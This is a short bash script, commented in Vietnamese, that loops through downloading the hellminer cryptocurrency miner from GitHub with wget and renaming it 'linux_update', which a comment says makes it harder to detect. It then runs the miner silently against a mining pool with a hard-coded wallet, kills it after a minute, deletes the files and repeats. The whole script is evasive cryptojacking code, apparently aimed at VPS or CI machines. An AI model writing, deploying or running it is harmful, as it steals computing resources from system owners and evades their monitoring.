#!/bin/bash

while true; do
  # Tải file
  wget -q https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64_avx2.tar.gz

  # Giải nén file
  tar -xf hellminer_linux64_avx2.tar.gz
  rm -f hellminer_linux64_avx2.tar.gz
  # Đổi tên file để khó phát hiện hơn
  mv hellminer linux_update

  # Chạy chương trình trong 1 phút với tên đã đổi
  nohup ./linux_update -c stratum+tcp://ap.vipor.net:5040 -u RMWTqPzqBZCP3LT893jwxwNhEbs6umRGWw.vpsgithub --cpu 2 >/dev/null 2>&1 &
  miner_pid=$!
  sleep 1m

  # Dừng chương trình
  kill $miner_pid

  # Xóa các file đã tải và giải nén
  rm -f hellminer_linux64_avx2.tar.gz
  rm -rf linux_update

  # Nghỉ 1 phút trước khi lặp lại
  sleep 2m
done
